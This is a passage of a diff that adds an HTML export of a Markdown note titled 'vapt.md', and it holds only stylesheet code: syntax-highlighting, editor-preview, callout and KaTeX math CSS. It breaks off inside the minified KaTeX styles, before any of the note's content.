@@ -1,0 +1,2595 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title>vapt.md</title>
+<meta http-equiv="Content-type" content="text/html;charset=UTF-8">
+
+<style>
+/*
+
+Arduino® Light Theme - Stefania Mellai <s.mellai@arduino.cc>
+
+*/
+
+.hljs {
+  display: block;
+  overflow-x: auto;
+  padding: 0.5em;
+  background: #FFFFFF;
+}
+
+.hljs,
+.hljs-subst {
+  color: #434f54;
+}
+
+.hljs-keyword,
+.hljs-attribute,
+.hljs-selector-tag,
+.hljs-doctag,
+.hljs-name {
+  color: #00979D;
+}
+
+.hljs-built_in,
+.hljs-literal,
+.hljs-bullet,
+.hljs-code,
+.hljs-addition {
+  color: #D35400;
+}
+
+.hljs-regexp,
+.hljs-symbol,
+.hljs-variable,
+.hljs-template-variable,
+.hljs-link,
+.hljs-selector-attr,
+.hljs-selector-pseudo {
+  color: #00979D;
+}
+
+.hljs-type,
+.hljs-string,
+.hljs-selector-id,
+.hljs-selector-class,
+.hljs-quote,
+.hljs-template-tag,
+.hljs-deletion {
+  color: #005C5F;
+}
+
+.hljs-title,
+.hljs-section {
+  color: #880000;
+  font-weight: bold;
+}
+
+.hljs-comment {
+  color: rgba(149,165,166,.8);
+}
+
+.hljs-meta-keyword {
+  color: #728E00;
+}
+
+.hljs-meta {
+  color: #434f54;
+}
+
+.hljs-emphasis {
+  font-style: italic;
+}
+
+.hljs-strong {
+  font-weight: bold;
+}
+
+.hljs-function {
+  color: #728E00;
+}
+
+.hljs-number {
+  color: #8A7B52;  
+}
+
+</style>
+
+<style>
+/*---------------------------------------------------------------------------------------------
+ *  Copyright (c) Microsoft Corporation. All rights reserved.
+ *  Licensed under the MIT License. See License.txt in the project root for license information.
+ *--------------------------------------------------------------------------------------------*/
+
+body {
+	font-family:   "HelveticaNeue-Light", sans-serif, "宋体","Segoe WPC", "Segoe UI", "SFUIText-Light","Droid Sans Fallback";
+	font-size: 18px;
+	padding: 0 12px;
+	line-height: 1.6;
+	word-wrap: break-word;
+	color: #333333;
+}
+
+.content-wrapper{
+	max-width: 860px;
+    margin: 0 auto;
+    padding: 0 30px;
+}
+
+#code-csp-warning {
+	position: fixed;
+	top: 0;
+	right: 0;
+	color: white;
+	margin: 16px;
+	text-align: center;
+	font-size: 12px;
+	font-family: sans-serif;
+	background-color:#444444;
+	cursor: pointer;
+	padding: 6px;
+	box-shadow: 1px 1px 1px rgba(0,0,0,.25);
+}
+
+#code-csp-warning:hover {
+	text-decoration: none;
+	background-color:#007acc;
+	box-shadow: 2px 2px 2px rgba(0,0,0,.25);
+}
+
+
+body.scrollBeyondLastLine {
+	margin-bottom: calc(100vh - 22px);
+}
+
+body.showEditorSelection .code-line {
+	position: relative;
+}
+
+body.showEditorSelection .code-active-line:before,
+body.showEditorSelection .code-line:hover:before {
+	content: "";
+	display: block;
+	position: absolute;
+	top: 0;
+	left: -12px;
+	height: 100%;
+}
+
+body.showEditorSelection li.code-active-line:before,
+body.showEditorSelection li.code-line:hover:before {
+	left: -30px;
+}
+
+.vscode-light.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.15);
+}
+
+.vscode-light.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(0, 0, 0, 0.40);
+}
+
+.vscode-dark.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.4);
+}
+
+.vscode-dark.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 255, 255, 0.60);
+}
+
+.vscode-high-contrast.showEditorSelection .code-active-line:before {
+	border-left: 3px solid rgba(255, 160, 0, 0.7);
+}
+
+.vscode-high-contrast.showEditorSelection .code-line:hover:before {
+	border-left: 3px solid rgba(255, 160, 0, 1);
+}
+
+img {
+	max-width: 100%;
+	max-height: 100%;
+}
+
+a {
+	color: #4080D0;
+	text-decoration: none;
+}
+
+a:focus,
+input:focus,
+select:focus,
+textarea:focus {
+	outline: 1px solid -webkit-focus-ring-color;
+	outline-offset: -1px;
+}
+
+hr {
+	border: 0;
+	height: 2px;
+	border-bottom: 2px solid;
+}
+
+h1 {
+	padding-bottom: 0.3em;
+	line-height: 1.2;
+	border-bottom: 1px solid #eee;
+}
+
+
+h2{
+	padding-bottom: .3em;
+    font-size: 2em;
+    line-height: 1.225;
+    border-bottom: 1px solid #eee;
+}
+
+h3{
+	font-size: 1.75em;
+    line-height: 1.225;
+}
+
+h1, h2, h3 {
+	font-weight: bold;
+}
+
+h1 code,
+h2 code,
+h3 code,
+h4 code,
+h5 code,
+h6 code {
+	font-size: inherit;
+	line-height: auto;
+}
+
+a:hover {
+	color: #4080D0;
+	text-decoration: underline;
+}
+
+table {
+	border-collapse: collapse;
+}
+
+table > thead > tr > th {
+	text-align: left;
+	border-bottom: 1px solid;
+}
+
+table > thead > tr > th,
+table > thead > tr > td,
+table > tbody > tr > th,
+table > tbody > tr > td {
+	padding: 5px 10px;
+}
+
+table > tbody > tr + tr > td {
+	border-top: 1px solid;
+}
+
+blockquote {
+	margin: 0 7px 0 5px;
+	padding: 0 16px 0 10px;
+	border-left: 5px solid;
+}
+
+code {
+	font-family: Menlo, Monaco, Consolas, "Droid Sans Mono", "Courier New", monospace, "Droid Sans Fallback";
+	font-size: 14px;
+	line-height: 19px;
+}
+
+body.wordWrap pre {
+	white-space: pre-wrap;
+}
+
+.mac code {
+	font-size: 12px;
+	line-height: 18px;
+}
+
+pre:not(.hljs),
+pre.hljs code > div {
+	padding: 16px;
+	border-radius: 3px;
+	overflow: auto;
+}
+
+/** Theming */
+
+.vscode-light,
+.vscode-light pre code {
+	color: rgb(30, 30, 30);
+}
+
+.vscode-dark,
+.vscode-dark pre code {
+	color: #DDD;
+}
+
+.vscode-high-contrast,
+.vscode-high-contrast pre code {
+	color: white;
+}
+
+.vscode-light code {
+	color: #A31515;
+}
+
+.vscode-dark code {
+	color: #D7BA7D;
+}
+
+.vscode-light pre:not(.hljs),
+.vscode-light code > div {
+	background-color: rgba(220, 220, 220, 0.4);
+}
+
+.vscode-dark pre:not(.hljs),
+.vscode-dark code > div {
+	background-color: rgba(10, 10, 10, 0.4);
+}
+
+.vscode-high-contrast pre:not(.hljs),
+.vscode-high-contrast code > div {
+	background-color: rgb(0, 0, 0);
+}
+
+.vscode-high-contrast h1 {
+	border-color: rgb(0, 0, 0);
+}
+
+.vscode-light table > thead > tr > th {
+	border-color: rgba(0, 0, 0, 0.69);
+}
+
+.vscode-dark table > thead > tr > th {
+	border-color: rgba(255, 255, 255, 0.69);
+}
+
+.vscode-light h1,
+.vscode-light hr,
+.vscode-light table > tbody > tr + tr > td {
+	border-color: rgba(0, 0, 0, 0.18);
+}
+
+.vscode-dark h1,
+.vscode-dark hr,
+.vscode-dark table > tbody > tr + tr > td {
+	border-color: rgba(255, 255, 255, 0.18);
+}
+
+.vscode-light blockquote,
+.vscode-dark blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.vscode-high-contrast blockquote {
+	background: transparent;
+	border-color: #fff;
+}
+</style>
+
+<style>
+/* Obsidian syntax defaults for legacy export (PDF / HTML / DOCX) */
+
+.callout {
+	--callout-accent: #0969da;
+	margin: 12px 0;
+	border-radius: 6px;
+	border-left: 4px solid var(--callout-accent);
+	background: rgba(9, 105, 218, 0.08);
+	color: #333333;
+	overflow: hidden;
+}
+
+.callout[data-callout="note"],
+.callout[data-callout="abstract"],
+.callout[data-callout="info"],
+.callout[data-callout="todo"],
+.callout[data-subtype="note"],
+.callout[data-subtype="abstract"],
+.callout[data-subtype="info"],
+.callout[data-subtype="todo"],
+.callout[data-callout="note" i],
+.callout[data-callout="abstract" i],
+.callout[data-callout="info" i],
+.callout[data-callout="todo" i],
+.callout[data-subtype="note" i],
+.callout[data-subtype="abstract" i],
+.callout[data-subtype="info" i],
+.callout[data-subtype="todo" i] {
+	--callout-accent: #0969da;
+	border-left-color: #0969da;
+	background: rgba(9, 105, 218, 0.08);
+}
+
+.callout[data-callout="tip"],
+.callout[data-callout="hint"],
+.callout[data-subtype="tip"],
+.callout[data-subtype="hint"],
+.callout[data-callout="tip" i],
+.callout[data-callout="hint" i],
+.callout[data-subtype="tip" i],
+.callout[data-subtype="hint" i] {
+	--callout-accent: #116329;
+	border-left-color: #116329;
+	background: rgba(17, 99, 41, 0.08);
+}
+
+.callout[data-callout="important"],
+.callout[data-subtype="important"],
+.callout[data-callout="important" i],
+.callout[data-subtype="important" i] {
+	--callout-accent: #8250df;
+	border-left-color: #8250df;
+	background: rgba(130, 80, 223, 0.08);
+}
+
+.callout[data-callout="warning"],
+.callout[data-subtype="warning"],
+.callout[data-callout="warning" i],
+.callout[data-subtype="warning" i] {
+	--callout-accent: #bc4c00;
+	border-left-color: #bc4c00;
+	background: rgba(188, 76, 0, 0.08);
+}
+
+.callout[data-callout="caution"],
+.callout[data-callout="danger"],
+.callout[data-callout="error"],
+.callout[data-callout="bug"],
+.callout[data-callout="fail"],
+.callout[data-subtype="caution"],
+.callout[data-subtype="danger"],
+.callout[data-subtype="error"],
+.callout[data-subtype="bug"],
+.callout[data-subtype="fail"],
+.callout[data-callout="caution" i],
+.callout[data-callout="danger" i],
+.callout[data-callout="error" i],
+.callout[data-callout="bug" i],
+.callout[data-callout="fail" i],
+.callout[data-subtype="caution" i],
+.callout[data-subtype="danger" i],
+.callout[data-subtype="error" i],
+.callout[data-subtype="bug" i],
+.callout[data-subtype="fail" i] {
+	--callout-accent: #cf222e;
+	border-left-color: #cf222e;
+	background: rgba(207, 34, 46, 0.08);
+}
+
+.callout[data-callout="question"],
+.callout[data-callout="help"],
+.callout[data-callout="faq"],
+.callout[data-subtype="question"],
+.callout[data-subtype="help"],
+.callout[data-subtype="faq"],
+.callout[data-callout="question" i],
+.callout[data-callout="help" i],
+.callout[data-callout="faq" i],
+.callout[data-subtype="question" i],
+.callout[data-subtype="help" i],
+.callout[data-subtype="faq" i] {
+	--callout-accent: #9a6700;
+	border-left-color: #9a6700;
+	background: rgba(154, 103, 0, 0.08);
+}
+
+.callout .callout-title,
+.callout .callout-info {
+	display: flex;
+	align-items: center;
+	gap: 8px;
+	padding: 12px 14px 0;
+	margin-bottom: 10px;
+	color: var(--callout-accent);
+}
+
+.callout .callout-title-icon,
+.callout .callout-icon {
+	display: inline-flex;
+	align-items: center;
+	justify-content: center;
+	width: 16px;
+	height: 16px;
+	flex-shrink: 0;
+	color: var(--callout-accent);
+}
+
+.callout .callout-title-icon svg {
+	width: 16px;
+	height: 16px;
+}
+
+.callout .callout-title-inner,
+.callout .callout-info > .callout-title {
+	font-weight: 700;
+	font-size: 0.95em;
+	line-height: 1.35;
+	color: var(--callout-accent);
+}
+
+.callout .callout-content {
+	padding: 6px 14px 12px;
+	color: #333333;
+}
+
+.callout .callout-content > :first-child {
+	margin-top: 0;
+}
+
+.callout .callout-content > :last-child {
+	margin-bottom: 0;
+}
+
+.obsidian-wikilink {
+	color: #7c3aed;
+	text-decoration: underline;
+}
+
+.obsidian-wikilink-embed {
+	display: inline-block;
+	padding: 2px 8px;
+	border: 1px dashed #d0d7de;
+	border-radius: 4px;
+	color: #7c3aed;
+}
+
+.obsidian-tag {
+	color: #7c3aed;
+	background: rgba(124, 58, 237, 0.12);
+	border-radius: 4px;
+	padding: 0 4px;
+}
+
+mark {
+	background: rgba(154, 103, 0, 0.35);
+	color: inherit;
+	padding: 0 2px;
+	border-radius: 2px;
+}
+
+[data-type="yaml-front-matter"] {
+	margin: 0 0 16px;
+}
+
+.vditor-properties {
+	border: 1px solid #d0d7de;
+	border-radius: 8px;
+	background: #f6f8fa;
+	overflow: hidden;
+}
+
+.vditor-properties__heading {
+	display: flex;
+	align-items: center;
+	gap: 8px;
+	padding: 8px 12px;
+	border-bottom: 1px solid #d0d7de;
+	background: #f3f4f6;
+	font-size: 0.85rem;
+	font-weight: 600;
+	color: #6b7280;
+}
+
+.vditor-properties__heading-icon::before {
+	content: "☰";
+	opacity: 0.75;
+}
+
+.vditor-properties__table {
+	display: flex;
+	flex-direction: column;
+}
+
+.vditor-properties__row {
+	display: grid;
+	grid-template-columns: minmax(120px, 34%) 1fr;
+	gap: 8px 12px;
+	align-items: start;
+	padding: 8px 12px;
+	border-top: 1px solid rgba(208, 215, 222, 0.45);
+}
+
+.vditor-properties__row:first-child {
+	border-top: none;
+}
+
+.vditor-properties__key {
+	display: flex;
+	align-items: center;
+	gap: 6px;
+	min-width: 0;
+	color: #6b7280;
+	font-size: 0.85rem;
+}
+
+.vditor-properties__key-icon {
+	flex-shrink: 0;
+	width: 14px;
+	height: 14px;
+	opacity: 0.72;
+	text-align: center;
+}
+
+.vditor-properties__key-icon[data-icon="tag"]::before { content: "#"; }
+.vditor-properties__key-icon[data-icon="alias"]::before { content: "⛓"; }
+.vditor-properties__key-icon[data-icon="date"]::before { content: "📅"; }
+.vditor-properties__key-icon[data-icon="toggle"]::before { content: "◉"; }
+.vditor-properties__key-icon[data-icon="number"]::before { content: "#"; }
+.vditor-properties__key-icon[data-icon="list"]::before { content: "≡"; }
+.vditor-properties__key-icon[data-icon="text"]::before { content: "T"; }
+
+.vditor-properties__key-label {
+	overflow: hidden;
+	text-overflow: ellipsis;
+	white-space: nowrap;
+}
+
+.vditor-properties__value {
+	min-width: 0;
+	font-size: 0.92rem;
+	color: #333333;
+	word-break: break-word;
+}
+
+.vditor-properties__value--tags,
+.vditor-properties__value--aliases {
+	display: flex;
+	flex-wrap: wrap;
+	gap: 4px;
+}
+
+.vditor-properties__value--aliases {
+	gap: 6px;
+}
+
+.vditor-properties__list {
+	margin: 0;
+	padding-left: 1.1rem;
+}
+
+.vditor-properties__checkbox {
+	display: inline-block;
+	width: 14px;
+	height: 14px;
+	margin-right: 6px;
+	border: 1px solid #d0d7de;
+	border-radius: 3px;
+	vertical-align: -2px;
+	background: #ffffff;
+}
+
+.vditor-properties__checkbox[is-checked="true"] {
+	background: #7c3aed;
+	border-color: #7c3aed;
+	box-shadow: inset 0 0 0 2px #ffffff;
+}
+
+.vditor-properties__empty {
+	opacity: 0.45;
+}
+
+</style>
+
+<style>
+pre {
+	background-color: #f8f8f8;
+	border: 1px solid #cccccc;
+	border-radius: 3px;
+	overflow-x: auto;
+	white-space: pre-wrap;
+	overflow-wrap: break-word;
+}
+
+pre:not(.hljs) {
+	padding: 23px;
+	line-height: 19px;
+}
+
+blockquote {
+	background: rgba(127, 127, 127, 0.1);
+	border-color: rgba(0, 122, 204, 0.5);
+}
+
+.emoji {
+	height: 1.4em;
+}
+
+/* for inline code */
+:not(pre):not(.hljs) > code {
+	color: #C9AE75; /* Change the old color so it seems less like an error */
+	font-size: inherit;
+}
+
+/* Page Break : use <div class="page"/> to insert page break
+-------------------------------------------------------- */
+.page {
+	page-break-after: always;
+}
+
+.table-of-contents li{
+	list-style-type: initial;
+}
+
+</style>
+
+<style>
+@font-face{font-display:block;font-family:KaTeX_AMS;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_AMS-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_AMS-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_AMS-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Caligraphic;font-style:normal;font-weight:700;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Caligraphic-Bold.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Caligraphic-Bold.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Caligraphic-Bold.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Caligraphic;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Caligraphic-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Caligraphic-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Caligraphic-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Fraktur;font-style:normal;font-weight:700;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Fraktur-Bold.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Fraktur-Bold.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Fraktur-Bold.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Fraktur;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Fraktur-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Fraktur-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Fraktur-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Main;font-style:normal;font-weight:700;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Bold.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Bold.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Bold.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Main;font-style:italic;font-weight:700;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-BoldItalic.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-BoldItalic.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-BoldItalic.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Main;font-style:italic;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Italic.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Italic.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Italic.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Main;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Main-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Math;font-style:italic;font-weight:700;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Math-BoldItalic.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Math-BoldItalic.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Math-BoldItalic.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Math;font-style:italic;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Math-Italic.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Math-Italic.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Math-Italic.ttf") format("truetype")}@font-face{font-display:block;font-family:"KaTeX_SansSerif";font-style:normal;font-weight:700;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Bold.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Bold.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Bold.ttf") format("truetype")}@font-face{font-display:block;font-family:"KaTeX_SansSerif";font-style:italic;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Italic.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Italic.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Italic.ttf") format("truetype")}@font-face{font-display:block;font-family:"KaTeX_SansSerif";font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_SansSerif-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Script;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Script-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Script-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Script-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Size1;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size1-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size1-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size1-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Size2;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size2-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size2-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size2-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Size3;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size3-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size3-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size3-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Size4;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size4-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size4-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Size4-Regular.ttf") format("truetype")}@font-face{font-display:block;font-family:KaTeX_Typewriter;font-style:normal;font-weight:400;src:url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Typewriter-Regular.woff2") format("woff2"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Typewriter-Regular.woff") format("woff"),url("https://cdn.jsdelivr.net/npm/katex@0.16.2/dist/fonts/KaTeX_Typewriter-Regular.ttf") format("truetype")}.katex{font:normal 1.21em KaTeX_Main,Times New Roman,serif;line-height:1.2;position:relative;text-indent:0;text-rendering:auto}.katex *{-ms-high-contrast-adjust:none!important;border-color:currentColor}.katex .katex-version:after{content:"0.16.47"}.katex .katex-mathml{border:0;-webkit-clip-path:inset(50%);clip-path:inset(50%);height:1px;overflow:hidden;padding:0;position:absolute;width:1px}.katex .katex-html>.newline{display:block}.katex .base{position:relative;white-space:nowrap;width:-webkit-min-content;width:-moz-min-content;width:min-content}.katex .base,.katex .strut{display:inline-block}.katex .textbf{font-weight:700}.katex .textit{font-style:italic}.katex .textrm{font-family:KaTeX_Main}.katex .textsf{font-family:KaTeX_SansSerif}.katex .texttt{font-family:KaTeX_Typewriter}.katex .mathnormal{font-family:KaTeX_Math;font-style:italic}.katex .mathit{font-family:KaTeX_Main;font-style:italic}.katex .mathrm{font-style:normal}.katex .mathbf{font-family:KaTeX_Main;font-weight:700}.katex .boldsymbol{font-family:KaTeX_Math;font-style:italic;font-weight:700}.katex .amsrm,.katex .mathbb,.katex .textbb{font-family:KaTeX_AMS}.katex .mathcal{font-family:KaTeX_Caligraphic}.katex .mathfrak,.katex .textfrak{font-family:KaTeX_Fraktur}.katex .mathboldfrak,.katex .textboldfrak{font-family:KaTeX_Fraktur;font-weight:700}.katex .mathtt{font-family:KaTeX_Typewriter}.katex .mathscr,.katex .textscr{font-family:KaTeX_Script}.katex .mathsf,.katex .textsf{font-family:KaTeX_SansSerif}.katex .mathboldsf,.katex .textboldsf{font-family:KaTeX_SansSerif;font-weight:700}.katex .mathitsf,.katex .mathsfit,.katex .textitsf{font-family:KaTeX_SansSerif;font-style:italic}.katex .mainrm{font-family:KaTeX_Main;font-style:normal}.katex .vlist-t{border-collapse:collapse;display:inline-table;table-layout:fixed}.katex .vlist-r{display:table-row}.katex .vlist{display:table-cell;position:relative;vertical-align:bottom}.katex .vlist>span{display:block;height:0;position:relative}.katex .vlist>span>span{display:inline-block}.katex .vlist>span>.pstrut{overflow:hidden;width:0}.katex .vlist-t2{margin-right:-2px}.katex .vlist-s{display:table-cell;font-size:1px;min-width:2px;vertical-align:bottom;width:2px}.katex .vbox{align-items:baseline;display:inline-flex;flex-direction:column}.katex .hbox{width:100%}.katex .hbox,.katex .thinbox{display:inline-flex;flex-direction:row}.katex .thinbox{max-width:0;width:0}.katex .msupsub{text-align:left}.katex .mfrac>span>span{text-align:center}.katex .mfrac .frac-line{border-bottom-style:solid;display:inline-block;width:100%}.katex .hdashline,.katex .hline,.katex .mfrac .frac-line,.katex .overline .overline-line,.katex .rule,.katex .underline .underline-line{min-height:1px}.katex .mspace{display:inline-block}.katex .smash{display:inline;line-height:0}.katex .clap,.katex .llap,.katex .rlap{position:relative;width:0}.katex .clap>.inner,.katex .llap>.inner,.katex .rlap>.inner{position:absolute}.katex .clap>.fix,.katex .llap>.fix,.katex .rlap>.fix{display:inline-block}.katex .llap>.inner{right:0}.katex .clap>.inner,.katex .rlap>.inner{left:0}.katex .clap>.inner>span{margin-left:-50%;margin-right:50%}.katex .rule{border:0 solid;display:inline-block;position:relative}.katex .hline,.katex .overline .overline-line,.katex .underline .underline-line{border-bottom-style:solid;display:inline-block;width:100%}.katex .hdashline{border-bottom-style:dashed;display:inline-block;width:100%}.katex .sqrt>.root{margin-left:.2777777778em;margin-right:-.5555555556em}.katex .fontsize-ensurer.reset-size1.size1,.katex .sizing.reset-size1.size1{font-size:1em}.katex .fontsize-ensurer.reset-size1.size2,.katex .sizing.reset-size1.size2{font-size:1.2em}.katex .fontsize-ensurer.reset-size1.size3,.katex .sizing.reset-size1.size3{font-size:1.4em}.katex .fontsize-ensurer.reset-size1.size4,.katex .sizing.reset-size1.size4{font-size:1.6em}.katex .fontsize-ensurer.reset-size1.size5,.katex .sizing.reset-size1.size5{font-size:1.8em}.katex .fontsize-ensurer.reset-size1.size6,.katex .sizing.reset-size1.size6{font-size:2em}.katex .fontsize-ensurer.reset-size1.size7,.katex .sizing.reset-size1.size7{font-size:2.4em}.katex .fontsize-ensurer.reset-size1.size8,.katex .sizing.reset-size1.size8{font-size:2.88em}.katex .fontsize-ensurer.reset-size1.size9,.katex .sizing.reset-size1.size9{font-size:3.456em}.katex .fontsize-ensurer.reset-size1.size10,.katex .sizing.reset-size1.size10{font-size:4.148em}.katex .fontsize-ensurer.reset-size1.size11,.katex .sizing.reset-size1.size11{font-size:4.976em}.katex .fontsize-ensurer.reset-size2.size1,.katex .sizing.reset-size2.size1{font-size:.8333333333em}.katex .fontsize-ensurer.reset-size2.size2,.katex .sizing.reset-size2.size2{font-size:1em}.katex .fontsize-ensurer.reset-size2.size3,.katex .sizing.reset-size2.size3{font-size:1.1666666667em}.katex .fontsize-ensurer.reset-size2.size4,.katex .sizing.reset-size2.size4{font-size:1.3333333333em}.katex .fontsize-ensurer.reset-size2.size5,.katex .sizing.reset-size2.size5{font-size:1.5em}.katex .fontsize-ensurer.reset-size2.size6,.katex .sizing.reset-size2.size6{font-size:1.6666666667em}.katex .fontsize-ensurer.reset-size2.size7,.katex .sizing.reset-size2.size7{font-size:2em}.katex .fontsize-ensurer.reset-size2.size8,.katex .sizing.reset-size2.size8{font-size:2.4em}.katex .fontsize-ensurer.reset-size2.size9,.katex .sizing.reset-size2.size9{font-size:2.88em}.katex .fontsize-ensurer.reset-size2.size10,.katex .sizing.reset-size2.size10{font-size:3.4566666667em}.katex .fontsize-ensurer.reset-size2.size11,.katex .sizing.reset-size2.size11{font-size:4.1466666667em}.katex .fontsize-ensurer.reset-size3.size1,.katex .sizing.reset-size3.size1{font-size:.7142857143em}.katex .fontsize-ensurer.reset-size3.size2,.katex .sizing.reset-size3.size2{font-size:.8571428571em}.katex .fontsize-ensurer.reset-size3.size3,.katex .sizing.reset-size3.size3{font-size:1em}.katex .fontsize-ensurer.reset-size3.size4,.katex 